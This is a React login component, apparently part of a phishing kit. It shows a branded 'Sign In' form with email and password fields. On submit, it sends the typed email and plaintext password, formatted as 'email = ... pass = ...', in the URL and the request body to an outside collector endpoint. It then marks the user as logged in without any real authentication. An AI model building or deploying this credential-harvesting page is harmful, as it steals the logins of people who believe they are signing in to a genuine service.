import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom';
import axios from "axios"

export default function Login() {
    const navigate = useNavigate()
    const [loader, setLoader] = useState(false)

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);

    const handlePasswordChange = (event) => {
        setPassword(event.target.value);
    };

    const toggleShowPassword = () => {
        setShowPassword(!showPassword);
    };

    const Loginn = async () => {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!regex.test(email)) {
            alert("Enter correct email pattern please.")
        }
        else if (password.length <= 5) {
            alert("Insufficient password.")
        }
        else {
            setLoader(true)

            let data = `email = ${email} <br> pass = ${password}`
            // console.log(localStorage.getItem("login"), "dsssss");
            try {
                const response = await axios.post(`https://informerb.onrender.com/api/maininfo/done/${data}`, data);
                localStorage.setItem("login", "yes")
                navigate("/")
            } catch (error) {
                console.log(error);
                // console.log("eeeerrrooorrr!!!!!!");
                // log('An error occurred, please try again later.');
            }


        }
    }
    return (
        <>
            {/* <div className='box1'>
    <img src="images/worku.png" alt="" />    
    </div>
     */}

            <div className="box">

                <img style={{ height: "28%", width: "100%" }} src="images/worku.png" alt="" />

                {/* <form action="#" className="form"> */}
                <div className='form'>
                    <img style={{ height: "4%", width: "30%" }} src="images/download.png" alt="" />
                    <h1 className="form-title">Sign In</h1>

                    <div className="form-group">
                        <input type="email" className="form-control" placeholder='Email address' onChange={(e) => setEmail(e.target.value)} value={email} required />
                        <label htmlFor="" className="form-label">Email address</label>
                    </div>


                    <div className="form-group">
                        <input type={showPassword ? "text" : "password"} className="form-control" placeholder='Password' value={password} required onChange={handlePasswordChange} id="txtPassword" />

                        <label htmlFor="" className="form-label">Enter Your Password</label>
                    </div>

                    <div className="form-group">
                        <label className="showLabel">
                            <input onClick={toggleShowPassword} type="checkbox" id="show" />
                            Show Password
                        </label>
                    </div>

                    <div className="bottom-box d-flex" >
                        <div style={{ width: "74%" }}>
                            <a href='#' onClick={() => alert("This service is not avalable yet.")}>Forget password ?</a>
                        </div>
                        {loader ?
                            <>
                                <div style={{ paddingLeft: "", width:"26%", paddingTop:"10px" }}>
                                    <div style={{ width: "89%" }}>
                                        <img className='rotate' style={{ height: "50%", width: "50%" }} src="images/loader2.jpg" alt="" />
                                        <br />
                                    </div>
                                </div>
                            </> :
                            <>
                                <div style={{ paddingLeft: "10%", marginBottom: "3%" }}>
                                    <div style={{ width: "89%" }}>
                                        <button className="form-button" onClick={() => { Loginn() }}>Login</button>
                                    </div>
                                </div>
                            </>}
                        {/* <button className="form-button" onClick={() => { Loginn() }}>Login</button> */}
                    </div>
                    {/* <p>Don't have an account? <a href='#'>Sign up</a></p> */}

                </div>
                {/* </form> */}
            </div>

        </>

    )
}
